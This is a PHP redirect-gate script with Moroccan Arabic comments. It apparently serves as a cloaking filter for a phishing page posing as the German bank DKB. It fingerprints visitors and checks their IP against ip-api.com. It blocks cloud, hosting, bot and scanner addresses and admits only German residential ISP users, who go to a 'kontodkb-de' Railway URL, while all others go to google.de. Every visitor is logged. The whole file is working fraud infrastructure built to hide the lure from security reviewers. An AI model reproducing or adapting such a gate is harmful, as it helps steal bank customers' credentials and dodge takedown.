<?php
session_start();

function get_ip() {
    $h = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($h as $k) { if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]); }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = get_ip();  
$my_ip = " 160.177.134.224"; // الـ IP ديالك (تم إصلاح الفراغ)

// --- [1] الـفـلـتر أوتـوماتـيـكـياً ---
if (!isset($_GET['check'])) {
    echo '<script>window.location.replace("gate.php?check=1&w="+window.screen.width+"&p="+navigator.platform);</script>';
    exit();
}

if (isset($_GET['check'])) {
    $status = "Blocked";
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $rdns = strtolower(@gethostbyaddr($ip));
    
    // API Check - مـعلومات الـ IP
    $res = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode,isp,org,as,hosting,proxy"));

    if ($res && $res->status == 'success') {
        $isp = $res->isp ?? 'Unknown';
        $org = $res->org ?? 'Unknown';
        $full_data = strtolower($isp . " " . $org . " " . ($res->as ?? '') . " " . $rdns);
        
        // [Blacklist] - الفلترة القوية (host, llc, ltd)
        $blacklist = ['amazon', 'aws', 'google', 'facebook', 'microsoft', 'azure', 'digitalocean', 'ovh', 'hetzner', 'leaseweb', 'datacenter', 'vps', 'server', 'hosting', 'host', 'cloud', 'bot', 'spider', 'crawl', 'scanner'];
        
        // [Whitelist] - الـ ISPs الحقيقيين ف ألمانيا
       $whitelist = [
    // اللائحة ديالك والشركات الكبرى
    'telekom', 't-mobile', 'vodafone', 'telefonica', 'o2', '1&1', '1 and 1', 
    'united internet', 'versatel', 'kabel', 'pyur', 'tele columbus', 
    'netcologne', 'm-net', 'ewe', 'ewe tel', 'unitymedia', 'wilhelm.tel',
    'deutsche glasfaser', 'vse net', 'congstar', 'otelo',
    
    // الشركات التابعة لشبكات الهاتف (Mobile MVNOs & Sub-brands)
    'mobilcom-debitel', 'freenet', 'klarmobil', 'blau', 'aldi talk', 
    'lidl connect', 'tchibo mobil', 'edeka smart', 'fraenk', 'lebara', 
    'lycamobile', 'ortel mobile', 'ay yildiz', 'netzclub', 'sim.de', 'simplytel',
    'smartmobil', 'winsim', 'premiumsim', 'discoplus', 'drillisch',
    
    // الشركات المحلية، ديال المدن والألياف البصرية (Regional & Fiber ISPs)
    'htp', 'netaachen', 'willy.tel', 'osnatel', 'swb', 'r-kom', 'inexio', 
    'wemag', 'lew telnet', 'envia tel', 'gelsen-net', 'dokom21', 'wobcom', 
    'swn', 'netcom bw', 'netcom kassel', 'bitel', 'thüringer netkom', 
    'sachsenenergie', 'sachsengigabit', 'kevag telekom', 'deutsche giganetz', 
    'unsere grüne glasfaser', 'ugg', 'goetel', 'leonet', 'dns:net', 
    'tng stadtnetz', 'glasfaser nordwest', 'vattenfall eurofiber', 

    // شركات الطاقة لي كتعطي الإنترنت المنزلي (Energy Providers)
    'e.on highspeed', 'maingau energie', 'yello', 'enbw', 'stadtwerke',
    
    // سميات قديمة باقا كتبان في الـ ASN (Historic/Merged ISPs)
    'kabel deutschland', 'kabel bw', 'primacom', 'pepcom', 'qsc', 'plusnet', 
    'alice', 'arcor', 'hansenet', 'ish', 'iesy', 'wtnet',
    
    // شركات أخرى واتصال فضائي (Other DSL/VOIP/Satellite)
    'easybell', 'sipgate', 'ecotel', 'starlink', 'skydsl', 'filiago'
];

        $is_bot = false;
        foreach($blacklist as $b) { if(strpos($full_data, $b) !== false) { $is_bot = true; break; } }
        
        $is_real_german = false;
        foreach($whitelist as $w) { if(strpos($full_data, $w) !== false) { $is_real_german = true; break; } }

        // --- [ الـقـرار ] ---
        // 1. استثناء الـ IP ديالك (تمت إضافة trim للحماية)
        if (trim($ip) == trim($my_ip)) {
            $status = "Passed";
        } 
        // 2. شروط المرور الصارمة
        else if ($res->countryCode == 'DE' && $is_real_german && !$is_bot && !$res->hosting && !$res->proxy) {
            if ($_GET['w'] > 100) { $status = "Passed"; }
        }
    }

    // تـحليل الـجهاز والـمتصفح
    $device = "Unknown";
    if (preg_match('/iPhone|iPad|iPod/i', $ua)) { $device = "iOS"; }
    elseif (preg_match('/Android/i', $ua)) { $device = "Android"; }
    elseif (preg_match('/Windows/i', $ua)) { $device = "Windows"; }
    elseif (preg_match('/Macintosh/i', $ua)) { $device = "MacBook"; }

    $browser = "Unknown";
    if (strpos($ua, 'Chrome') !== false) { $browser = "Chrome"; }
    elseif (strpos($ua, 'Safari') !== false) { $browser = "Safari"; }
    elseif (strpos($ua, 'Firefox') !== false) { $browser = "Firefox"; }

    // --- [2] الـتـسـجـيل الـذكي (Smart Logging) ---
    $file = 'log.txt';
    $date = date("Y-m-d H:i:s");
    $country = $res->countryCode ?? '??';
    $isp_name = $res->isp ?? 'Unknown';
    $org_name = $res->org ?? 'Unknown';

    $lines = file_exists($file) ? file($file, FILE_IGNORE_NEW_LINES) : [];
    $found = false; 
    $new_content = [];

    foreach ($lines as $line) {
        if (empty($line)) continue;
        $parts = explode('|', $line);
        if ($parts[0] == $ip) {
            $parts[1] = $date;
            $parts[7] = $status;
            $parts[8] = intval($parts[8] ?? 1) + 1;
            $new_content[] = implode('|', $parts); 
            $found = true;
        } else { 
            $new_content[] = $line; 
        }
    }

    if (!$found) { 
        $new_content[] = "$ip|$date|$country|$isp_name|$org_name|$device|$browser|$status|1"; 
    }

    file_put_contents($file, implode("\n", $new_content) . "\n", LOCK_EX);

    // --- [3] الـRedirect الـنـهائي الـنـقـي ---
    if ($status == "Passed") {
        // حيدنا الزيادة ديال الـ IP هنا
        header("Location: https://kontodkb-de-production.up.railway.app");
        exit();
    } else {
        header("Location: https://www.google.de");
        exit();
    }
}
?>